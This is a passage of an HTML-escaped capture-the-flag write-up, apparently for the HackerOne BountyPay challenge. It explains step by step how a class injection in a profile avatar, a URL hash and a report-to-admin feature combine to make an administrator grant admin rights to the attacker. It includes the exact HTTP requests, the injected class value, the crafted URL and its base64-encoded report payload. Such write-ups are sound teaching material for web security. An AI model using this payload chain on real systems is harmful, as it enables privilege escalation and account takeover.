class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eUser Upgraded to Admin\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}),\u003c/span\u003e \n\u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.tab\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eclick\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.tab\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eremoveClass\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eactive\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eaddClass\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eactive\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ediv.content\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eaddClass\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehidden\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ediv.content-\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eattr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003edata-target\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)).\u003c/span\u003e\u003cspan class=\"nx\"\u003eremoveClass\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehidden\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}),\u003c/span\u003e \n\u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.sendReport\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eclick\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"kd\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e/admin/report?url=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eReport sent to admin team\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}),\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e#myModal\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003emodal\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehide\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}),\u003c/span\u003e \n\u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehash\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e#tab1\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehash\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.tab1\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003etrigger\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eclick\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e#tab2\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehash\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.tab2\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003etrigger\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eclick\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e#tab3\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehash\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.tab3\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003etrigger\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eclick\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e#tab4\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehash\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.tab4\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003etrigger\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eclick\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"observation-1\"\u003eObservation-1:\u003c/h2\u003e\n\n\u003cp\u003e\u003cstrong\u003eupgradeToAdmin\u003c/strong\u003e is not working for us, \u003cstrong\u003erequires admin privilages\u003c/strong\u003e.\u003cbr\u003e\nThere is a \u003cstrong\u003ereport functionality\u003c/strong\u003e is dashboard , we might use that to trigger the upgrade functionality on \u003cstrong\u003eadmin side\u003c/strong\u003e.\u003cbr\u003e\nThe report to admin request takes only \u003cstrong\u003epath of the url\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /admin/report?url=Lz90ZW1wbGF0ZT1ob21l HTTP/1.1\nHost: staff.bountypay.h1ctf.com\nCookie: token=c0lsdUV............\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWe have to trigger the upgrade to admin functionality locally only by the url.\u003c/p\u003e\n\n\u003cp\u003eObservation-2:\u003cbr\u003e\nAs the \u003cstrong\u003eavatar\u003c/strong\u003e is linked to the \u003cstrong\u003eclass names\u003c/strong\u003e (avatar1, avatar2, avatar2). our \u003cstrong\u003einput for avatar\u003c/strong\u003e is \u003cstrong\u003esimple a class name\u003c/strong\u003e.\u003cbr\u003e\nSo there is an \u003cstrong\u003eclass injection in avatar\u003c/strong\u003e. It supports \u003cstrong\u003emultiple classes\u003c/strong\u003e as it allows space char.\u003cbr\u003e\nWe can trigger that class injection on \u003ccode\u003e/?template=home\u003c/code\u003e and \u003ccode\u003e/?template=ticket\u0026amp;ticket_id=3582\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eObservation - 3:\u003cbr\u003e\n\u003cstrong\u003eupgrade to  admin\u003c/strong\u003e function has been linked to on click listner on \u003cstrong\u003eupgradeToAdmin class\u003c/strong\u003e\u003cbr\u003e\nBased on last line of website.js\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehash\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e#tab1\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehash\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.tab1\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003etrigger\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eclick\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e#tab2\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehash\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.tab2\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003etrigger\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eclick\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e#tab3\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehash\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.tab3\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003etrigger\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eclick\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e#tab4\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehash\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.tab4\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003etrigger\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eclick\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWe can \u003cstrong\u003etrigger onclick\u003c/strong\u003e using \u003cstrong\u003ehash and class names\u003c/strong\u003e, as already we have class names in our control for a div.\u003cbr\u003e\nWe can set the \u003cstrong\u003eclass name\u003c/strong\u003e as \u003ccode\u003etab4 upgradeToAdmin\u003c/code\u003e and \u003cstrong\u003ehash\u003c/strong\u003e as \u003ccode\u003e#tab4\u003c/code\u003e , which first makes the \u003cstrong\u003ediv to click\u003c/strong\u003e based on \u003cstrong\u003e.tab4 class name\u003c/strong\u003e \u003cbr\u003e\nAs the \u003cstrong\u003ediv also had upgradeToAdmin class\u003c/strong\u003e, now it triggers the upgradetoadmin function .\u003c/p\u003e\n\n\u003cp\u003eObservation - 4:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e    \u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003einput[name=\u0026quot;username\u0026quot;]\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eval\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"kd\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e/admin/upgrade?username=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eUser Upgraded to Admin\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt is taking the \u003cstrong\u003eusername\u003c/strong\u003e from \u003ccode\u003einput[name=\u0026quot;username\u0026quot;]\u003c/code\u003e, we need to find that type of gadget in html.\u003cbr\u003e\nafter checking all \u003cstrong\u003etemplates\u003c/strong\u003e , \u003cstrong\u003elogin template had that gadget\u003c/strong\u003e, weirdly there is no check for opening of login template even after loggedin.\u003cbr\u003e\nwe need to \u003cstrong\u003efill the username\u003c/strong\u003e field with our disired value only with url, tried with get params \u003ca title=\"https://staff.bountypay.h1ctf.com/?template=login\u0026amp;username=nice\" href=\"/redirect?url=https%3A%2F%2Fstaff.bountypay.h1ctf.com%2F%3Ftemplate%3Dlogin%26username%3Dnice\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://staff.bountypay.h1ctf.com/?template=login\u0026amp;username=nice\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e , Worked : )\u003c/p\u003e\n\n\u003cp\u003eObservation - 5:\u003cbr\u003e\nBut the \u003cstrong\u003elogin template\u003c/strong\u003e didn\u0026#39;t have \u003cstrong\u003eclass injection\u003c/strong\u003e, we need both \u003cstrong\u003elogin, ticket template\u003c/strong\u003e to make this happen.\u003cbr\u003e\nAs the template is based on get param, tried giving of multiple templates as array . Worked : )\u003c/p\u003e\n\n\u003cp\u003eFinally: \u003cbr\u003e\nBy combining all\u003cbr\u003e\nChange the avatar value to \u003ccode\u003etab4 upgradeToAdmin\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /?template=home HTTP/1.1\nHost: staff.bountypay.h1ctf.com\nCookie: token=c0lsdUV....\n\nprofile_name=sandra\u0026amp;profile_avatar=tab4 upgradeToAdmin\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOpen : \u003ca title=\"https://staff.bountypay.h1ctf.com/?template%5B%5D=login\u0026amp;username=sandra\u0026amp;template%5B%5D=ticket\u0026amp;ticket_id=3582#tab4\" href=\"/redirect?url=https%3A%2F%2Fstaff.bountypay.h1ctf.com%2F%3Ftemplate%255B%255D%3Dlogin%26username%3Dsandra%26template%255B%255D%3Dticket%26ticket_id%3D3582%23tab4\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://staff.bountypay.h1ctf.com/?template%5B%5D=login\u0026amp;username=sandra\u0026amp;template%5B%5D=ticket\u0026amp;ticket_id=3582#tab4\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nObserver the traffic, it automatically sends the upgrade to admin request . Now time to report it to admin.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ echo -n \u0026quot;/?template[]=login\u0026amp;username=sandra.allison\u0026amp;template[]=ticket\u0026amp;ticket_id=3582#tab4\u0026quot; | base64\nLz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlj\na2V0JnRpY2tldF9pZD0zNTgyI3RhYjQ=\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eVisit the URL : \u003ca title=\"https://staff.bountypay.h1ctf.com/admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjQ=\" href=\"/redirect?url=https%3A%2F%2Fstaff.bountypay.h1ctf.com%2Fadmin%2Freport%3Furl%3DLz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjQ%3D\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://staff.bountypay.h1ctf.com/admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjQ=\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eIt gives the new admin tab to the dashbaord.\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screenshot_from_2020-06-09_02-26-29.png\" 